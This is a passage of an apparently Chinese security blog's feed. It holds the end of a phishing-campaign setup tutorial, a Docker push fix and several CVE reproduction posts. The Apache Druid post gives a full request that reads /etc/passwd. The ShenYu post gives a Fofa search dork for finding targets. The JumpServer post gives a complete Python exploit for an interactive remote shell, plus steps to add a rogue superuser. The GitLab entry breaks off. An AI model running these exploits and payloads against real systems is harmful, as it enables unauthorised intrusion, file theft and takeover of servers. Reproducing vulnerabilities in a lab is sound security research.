title="6、查看战果"></a>6、查看战果</h2><p>这里有全部任务的统计</p><p><img src="https://img-blog.csdnimg.cn/img_convert/70fa1b66102aab96213d96520281fbce.png" alt="image-20220117190809333"></p><h2 id="7、打开详细内容"><a href="#7、打开详细内容" class="headerlink" title="7、打开详细内容"></a>7、打开详细内容</h2><p>可以看到发送成功的邮件、打开邮件的情况、点击链接的情况、提交数据的情况</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0c0676d59f3def6227b1500b131c39a7.png" alt="image-20220117180333865"></p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这个只是邮件钓鱼的基础设施搭建，和基本使用方式，后续还有很多要点，木马免杀、钓鱼话术、邮箱收集等等。。。还有就是通过IM的方式也是十分有效的，后续再说。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 运维 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker denied/ requested access to the resource is denied</title>
      <link href="/2021/12/24/docker%20denied!%20requested%20access%20to%20the%20resource%20is%20denied/"/>
      <url>/2021/12/24/docker%20denied!%20requested%20access%20to%20the%20resource%20is%20denied/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>将自己创建的docker镜像push到dockerhub上去，结果出现了以上错误</p><p>docker denied/ requested access to the resource is denied.md</p><h2 id="原因分析："><a href="#原因分析：" class="headerlink" title="原因分析："></a>原因分析：</h2><p>在build自己的镜像的时候添加tag时必须在前面加上自己的dockerhub的username，</p><p>例如我要往我账号里push本地镜像，命令</p><h2 id="第一步要将容器打包成镜像："><a href="#第一步要将容器打包成镜像：" class="headerlink" title="第一步要将容器打包成镜像："></a>第一步要将容器打包成镜像：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a&#x3D;&quot;test&quot; -m&#x3D;&quot;test&quot; 58b8cae10a89 test&#x2F;zyimage:0.0.1</span><br></pre></td></tr></table></figure><ul><li>test/zyimage:0.0.1</li><li>test是你在docker.hub上面的账户名，</li><li>zyimage是镜像名称，</li><li>0.0.1是镜像的tag。</li><li></li></ul><h2 id="第二部上传镜像，pull-对应的镜像就好了"><a href="#第二部上传镜像，pull-对应的镜像就好了" class="headerlink" title="第二部上传镜像，pull 对应的镜像就好了"></a>第二部上传镜像，pull 对应的镜像就好了</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push test&#x2F;zyimage:0.0.1</span><br></pre></td></tr></table></figure><p>完成后，在docker.hub里My Profile里的Repositories里就可以看到刚刚push的镜像</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker 容器 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache ShenYu JWT认证缺陷漏洞(CVE-2021-37580)</title>
      <link href="/2021/11/23/Apache%20ShenYu%20JWT%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E(CVE-2021-37580)/"/>
      <url>/2021/11/23/Apache%20ShenYu%20JWT%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E(CVE-2021-37580)/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞说明"><a href="#0x01-漏洞说明" class="headerlink" title="0x01 漏洞说明"></a><strong>0x01 漏洞说明</strong></h1><p>Apache ShenYu 是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。</p><p>Apache ShenYu Admin 存在身份验证绕过漏洞**（CVE-2021-37580）*_，该漏洞的CVSS评分为9.8*_**。由于ShenyuAdminBootstrap 中 JWT 的错误使用允许攻击者绕过身份验证，攻击者可通过该漏洞直接进入系统后台。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a><strong>0x02 影响版本</strong></h1><p>Apache ShenYu 2.3.0</p><p>Apache ShenYu 2.4.0</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a><strong>0x03 漏洞复现</strong></h1><p>Fofa搜索标题</p><p>body=“id=“httpPath””&amp;&amp;body=“th:text=”${domain}“”</p><p><img src="https://img-blog.csdnimg.cn/img_convert/542f94ce088591200dda9b59e6614f3a.png" alt="image-20211122090556150"></p><h4 id="验证POC："><a href="#验证POC：" class="headerlink" title="验证POC："></a>验证POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dashboardUser</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9c95a72756d8e6f0ce12110f51c50df9.png" alt="image-20211122090522526"></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>升级到最新版</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 安全 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid LoadData 任意文件读取 漏洞 CVE-2021-36749</title>
      <link href="/2021/11/17/Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20%E6%BC%8F%E6%B4%9E%20CVE-2021-36749/"/>
      <url>/2021/11/17/Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20%E6%BC%8F%E6%B4%9E%20CVE-2021-36749/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Apache-Druid-LoadData-任意文件读取-漏洞-CVE-2021-36749"><a href="#Apache-Druid-LoadData-任意文件读取-漏洞-CVE-2021-36749" class="headerlink" title="Apache Druid LoadData 任意文件读取 漏洞 CVE-2021-36749"></a>Apache Druid LoadData 任意文件读取 漏洞 CVE-2021-36749</h1><h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>在 Druid 系统中，InputSource 用于从某个数据源读取数据。但是，HTTP InputSource 允许经过身份验证的用户以 Druid 服务器进程的权限从其他来源读取数据，例如本地文件系统。</p><p>这不是用户直接访问 Druid 时的权限提升，因为 Druid 还提供了 Local InputSource，它允许相同级别的访问。但是当用户通过允许用户指定 HTTP InputSource 而不是 Local InputSource 的应用程序间接与 Druid 交互时，这是有问题的。</p><p>在这种情况下，用户可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。这个问题之前提到过，根据 CVE-2021-26920 在 0.21.0 中已修复，但在 0.21.0 或 0.21.1 中未修复。</p><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><p><strong>影响范围</strong> : Apache Druid &lt; 0.21.0</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/49d93b567e59a8ccc2f86fe0a36c3cc8.png" alt="image-20211117154507211"></p><p>URLS写入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f99a9ca6073b601d8c6cee96b72f539c.png" alt="image-20211117154925839"></p><h2 id="完整数据包"><a href="#完整数据包" class="headerlink" title="完整数据包"></a>完整数据包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler?for&#x3D;connect HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko&#x2F;20100101 Firefox&#x2F;94.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json;charset&#x3D;utf-8</span><br><span class="line">Content-Length: 423</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8888</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;unified-console.html</span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;inputSource&quot;:&#123;&quot;type&quot;:&quot;http&quot;,&quot;uris&quot;:[&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;]&#125;,&quot;inputFormat&quot;:&#123;&quot;type&quot;:&quot;regex&quot;,&quot;pattern&quot;:&quot;(.*)&quot;,&quot;columns&quot;:[&quot;raw&quot;]&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,&quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;,&quot;tuningConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;timeoutMs&quot;:15000&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h1><p>升级到0.21.0或更高版本</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux ssh centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jumpserver 远程命令执行RCE漏洞复现和利用</title>
      <link href="/2021/11/16/jumpserver%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2021/11/16/jumpserver%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><ul><li>JumpServer远程执行漏洞 RCE EXP</li><li>Jumpserver 是一款由python编写开源的跳板机(堡垒机)系统，是内网中的一种集权系统，拿下后基本上都是可以控制大量的服务器。</li><li>项目地址：<a href="https://github.com/jumpserver/jumpserver" target="_blank" rel="noopener">https://github.com/jumpserver/jumpserver</a></li></ul><h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><p>远程命令执行漏洞：由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，再通过敏感信息获取一个20s的token，最后利用这个token去执行相关API操作控制其中所有机器或者执行任意命令。</p><h1 id="0x03-影响版本："><a href="#0x03-影响版本：" class="headerlink" title="0x03 影响版本："></a>0x03 影响版本：</h1><ul><li>JumpServer &lt; v2.6.2</li><li>JumpServer &lt; v2.5.4</li><li>JumpServer &lt; v2.4.5</li><li>JumpServer = v1.5.9</li></ul><h1 id="0x04-复现环境搭建注意坑点"><a href="#0x04-复现环境搭建注意坑点" class="headerlink" title="0x04 复现环境搭建注意坑点"></a>0x04 复现环境搭建注意坑点</h1><p>环境搭建推荐使用一键安装，因为环境比较麻烦，而且还得是旧版的，这里是v2.6.1</p><p>安装脚本V2.6.1 <a href="https://www.o2oxy.cn/wp-content/uploads/2021/01/quick\_start.zip" target="_blank" rel="noopener">https://www.o2oxy.cn/wp-content/uploads/2021/01/quick\_start.zip</a></p><ul><li><p>注意要给环境配置高一点，否则会卡死。（我是 Centos 7 系统 4核 8G）</p></li><li><p>使用一件脚本的时候，推荐不使用外部 mysql和redis，这样他就会docker自己创建数据库，省的自己配报错。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/08318eeb8720b0c674c4eb8287a34be0.png" alt="image-20211116213713089"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/1a1729a9fe9247b7bd02e2f605b21c23.png" alt="image-20211116215738873"></p><ul><li><p>搭建好了，服务一键启动 ./jmsctl.sh restart</p></li><li><p>搭建好了，默认的账户和密码是 admin admin</p></li></ul><p><a href="http://10.211.55.22:8080/core/auth/login/" target="_blank" rel="noopener">http://10.211.55.22:8080/core/auth/login/</a></p><p>登陆之后还不能直接用，还有配置一下，分配一下服务器才能使用。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8e8852907fc97e38d85bc09ca22592b6.png" alt="image-20211116135025055"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4888afc5f2f426bb8d5eabac631fc026.png" alt="image-20211116140247634"></p><h3 id="1、创建一个系统用户"><a href="#1、创建一个系统用户" class="headerlink" title="1、创建一个系统用户"></a>1、创建一个系统用户</h3><ul><li>系统用户是 JumpServer 跳转登录资产时使用的用户</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/3e922b48c39c92d6754de772db51b2e9.png" alt="image-20211116162139678"></p><h3 id="2、创建管理用户"><a href="#2、创建管理用户" class="headerlink" title="2、创建管理用户"></a>2、创建管理用户</h3><p>管理用户是资产（被控服务器）上的 root，或拥有 NOPASSWD: ALL sudo 权限的用户</p><p>我的被管理主机就是 root root</p><p><img src="https://img-blog.csdnimg.cn/img_convert/222a88926397ebbec7c98a23fd209a01.png" alt="image-20211116162425352"></p><h3 id="3、创建资产"><a href="#3、创建资产" class="headerlink" title="3、创建资产"></a>3、创建资产</h3><p>就是要管理的终端</p><p><img src="https://img-blog.csdnimg.cn/img_convert/36c81e70871e16a288940a6bcb921401.png" alt="image-20211116161329363"></p><h3 id="4、资产授权"><a href="#4、资产授权" class="headerlink" title="4、资产授权"></a>4、资产授权</h3><p>只有给资产授权，控制台才有机器，才能管理</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9969bd1e5d8514028ea487c32148c05a.png" alt="image-20211116214033044"></p><h3 id="5、web终端连接"><a href="#5、web终端连接" class="headerlink" title="5、web终端连接"></a>5、web终端连接</h3><p>访问web终端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.22:8080&#x2F;luna&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/07b820bfb60ca201c31fa863fa7e70aa.png" alt="image-20211116213928187"></p><h1 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h1><h3 id="1、请求未授权-socketweb"><a href="#1、请求未授权-socketweb" class="headerlink" title="1、请求未授权 socketweb"></a>1、请求未授权 socketweb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.211.55.22:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br></pre></td></tr></table></figure><p>利用chrome插件<a href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related</a></p><p>请求log文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/e9b4cee05b52b138c70d2f2f2221577c.png" alt="image-20211116213021155"></p><h3 id="2、获取system-user-user-id-asset-id-这三个重要参数"><a href="#2、获取system-user-user-id-asset-id-这三个重要参数" class="headerlink" title="2、获取system_user user_id asset_id 这三个重要参数"></a>2、获取system_user user_id asset_id 这三个重要参数</h3><p>自己搜索一下这三个id</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8ed10c534fab1d14062957829ee51ffc.png" alt="image-20211116210851228"></p><p>所以获取到的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asset_id&#x3D;230f921b-be1c-4343-8bab-57d4410606bb&amp;cache_policy&#x3D;1&amp;system_user_id&#x3D;03705092-18e7-4b65-a12a-7991f9c50740&amp;user_id&#x3D;0cae929c-5f7a-41a4-b873-bc9d28613c4c</span><br></pre></td></tr></table></figure><h3 id="3、对应填入EXP中"><a href="#3、对应填入EXP中" class="headerlink" title="3、对应填入EXP中"></a>3、对应填入EXP中</h3><p>exp为了美观放到最后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件最后需要修改的：</span><br><span class="line"></span><br><span class="line">host &#x3D; &quot;http:&#x2F;&#x2F;10.211.55.22:8080&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">        &quot;user&quot;: &quot;0cae929c-5f7a-41a4-b873-bc9d28613c4c&quot;,</span><br><span class="line">        &quot;asset&quot;: &quot;230f921b-be1c-4343-8bab-57d4410606bb&quot;,</span><br><span class="line">        &quot;system_user&quot;: &quot;03705092-18e7-4b65-a12a-7991f9c50740&quot;,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4、成功利用："><a href="#4、成功利用：" class="headerlink" title="4、成功利用："></a>4、成功利用：</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/c4e44a2cc96703461ed95d3761de79ff.png" alt="image-20211116211942852"></p><h1 id="后利用：创建超管"><a href="#后利用：创建超管" class="headerlink" title="后利用：创建超管"></a>后利用：创建超管</h1><p>获取到shell，我们可以直接创建超管，毕竟主机权限没什么用，登陆系统之后才有大量的主机。</p><h3 id="命令行创建超管"><a href="#命令行创建超管" class="headerlink" title="命令行创建超管"></a>命令行创建超管</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">切换到目录  </span><br><span class="line">cd &#x2F;opt&#x2F;jumpserver&#x2F;apps</span><br><span class="line"></span><br><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/3626118f4be9daa0a4c4eba0406fba3d.png" alt="image-20211116151519867"></p><p>超管登陆成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f5dc04d591886d773e95e215e8ffba9e.png" alt="image-20211116151545855"></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>EXP 代码 仓库 <a href="https://github.com/Skactor/jumpserver\_rce" target="_blank" rel="noopener">https://github.com/Skactor/jumpserver\_rce</a></p><p>我实测，这个手动获取 asset_id system_user_id user_id 这三个可以正常触发漏洞，但是好多自动化获取多少有点问题，反正我的是没成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">import asyncio</span><br><span class="line">import aioconsole</span><br><span class="line"></span><br><span class="line">import websockets</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;?user-only&#x3D;1&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_celery_task_log_path(task_id):</span><br><span class="line">    task_id &#x3D; str(task_id)</span><br><span class="line">    rel_path &#x3D; os.path.join(task_id[0], task_id[1], task_id + &quot;.log&quot;)</span><br><span class="line">    path &#x3D; os.path.join(&quot;&#x2F;opt&#x2F;jumpserver&#x2F;&quot;, rel_path)</span><br><span class="line">    return path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def send_msg(websocket, _text):</span><br><span class="line">    if _text &#x3D;&#x3D; &quot;exit&quot;:</span><br><span class="line">        print(f&#39;you have enter &quot;exit&quot;, goodbye&#39;)</span><br><span class="line">        await websocket.close(reason&#x3D;&quot;user exit&quot;)</span><br><span class="line">        return False</span><br><span class="line">    await websocket.send(_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def send_loop(ws, session_id):</span><br><span class="line">    while True:</span><br><span class="line">        cmdline &#x3D; await aioconsole.ainput()</span><br><span class="line">        await send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;&quot;id&quot;: session_id, &quot;type&quot;: &quot;TERMINAL_DATA&quot;, &quot;data&quot;: cmdline + &quot;\n&quot;&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def recv_loop(ws):</span><br><span class="line">    while True:</span><br><span class="line">        recv_text &#x3D; await ws.recv()</span><br><span class="line">        ret &#x3D; json.loads(recv_text)</span><br><span class="line">        if ret.get(&quot;type&quot;, &quot;TERMINAL_DATA&quot;):</span><br><span class="line">            await aioconsole.aprint(ret[&quot;data&quot;], end&#x3D;&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 客户端主逻辑</span><br><span class="line">async def main_logic():</span><br><span class="line">    print(&quot;#######start ws&quot;)</span><br><span class="line">    async with websockets.connect(target) as client:</span><br><span class="line">        recv_text &#x3D; await client.recv()</span><br><span class="line">        print(f&quot;&#123;recv_text&#125;&quot;)</span><br><span class="line">        session_id &#x3D; json.loads(recv_text)[&quot;id&quot;]</span><br><span class="line">        print(&quot;get ws id:&quot; + session_id)</span><br><span class="line">        print(&quot;###############&quot;)</span><br><span class="line">        print(&quot;init ws&quot;)</span><br><span class="line">        print(&quot;###############&quot;)</span><br><span class="line">        inittext &#x3D; json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;id&quot;: session_id,</span><br><span class="line">                &quot;type&quot;: &quot;TERMINAL_INIT&quot;,</span><br><span class="line">                &quot;data&quot;: &#39;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#39;,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        await send_msg(client, inittext)</span><br><span class="line">        await asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    host &#x3D; &quot;http:&#x2F;&#x2F;10.211.55.22:8080&quot;</span><br><span class="line">    cmd &#x3D; &quot;whoami&quot;</span><br><span class="line">    if host[-1] &#x3D;&#x3D; &quot;&#x2F;&quot;:</span><br><span class="line">        host &#x3D; host[:-1]</span><br><span class="line">    print(host)</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;user&quot;: &quot;0cae929c-5f7a-41a4-b873-bc9d28613c4c&quot;,</span><br><span class="line">        &quot;asset&quot;: &quot;230f921b-be1c-4343-8bab-57d4410606bb&quot;,</span><br><span class="line">        &quot;system_user&quot;: &quot;03705092-18e7-4b65-a12a-7991f9c50740&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    print(&quot;##################&quot;)</span><br><span class="line">    print(&quot;get token url:%s&quot; % (host + url,))</span><br><span class="line">    print(&quot;##################&quot;)</span><br><span class="line">    res &#x3D; requests.post(host + url, json&#x3D;data)</span><br><span class="line">    token &#x3D; res.json()[&quot;token&quot;]</span><br><span class="line">    print(&quot;token:%s&quot;, (token,))</span><br><span class="line">    print(&quot;##################&quot;)</span><br><span class="line">    target &#x3D; (</span><br><span class="line">        &quot;ws:&#x2F;&#x2F;&quot; + host.replace(&quot;http:&#x2F;&#x2F;&quot;, &quot;&quot;) + &quot;&#x2F;koko&#x2F;ws&#x2F;token&#x2F;?target_id&#x3D;&quot; + token</span><br><span class="line">    )</span><br><span class="line">    print(&quot;target ws:%s&quot; % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows linux ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitlab 远程命令执行RCE漏洞CVE-2021-22205附exp</title>
      <link href="/2021/10/31/Gitlab%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE%E6%BC%8F%E6%B4%9ECVE-2021-22205%E9%99%84exp/"/>
      <url>/2021/10/31/Gitlab%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE%E6%BC%8F%E6%B4%9ECVE-2021-22205%E9%99%84exp/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞介绍-amp-原理"><a href="#0x01-漏洞介绍-amp-原理" class="headerlink" title="0x01 漏洞介绍&amp;原理"></a><strong>0x01 漏洞介绍&amp;原理</strong></h1><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，是一款Ruby开发的Git项目管理平台。由于在11.9以后的GitLab中，使用了图片处理工具ExifTool，而此图片处理工具又受到了漏洞CVE-2021-22204的影响：</p><p>漏洞触发ExifTool功能处，ExifTool是用于从图像中移除元数据的开源工具，在解析上传图像中的元数据时，并没有完全解析某些元数据，导致攻击者上传带有恶意元数据的图片，从而导致远程命令执行。</p><p>攻击者可以通过一个存在未授权的接口，上传一张恶意构造的图片，进而导致该漏洞在无需进行身份验证的情况下即可进行RCE</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a><strong>0x02 影响版本</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gitlab CE&#x2F;EE &lt; 13.10.3</span><br><span class="line">Gitlab CE&#x2F;EE &lt; 13.9.6</span><br><span class="line">Gitlab CE&#x2F;EE &lt; 13.8.8</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a><strong>0x03 漏洞检测</strong></h1><p>主页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 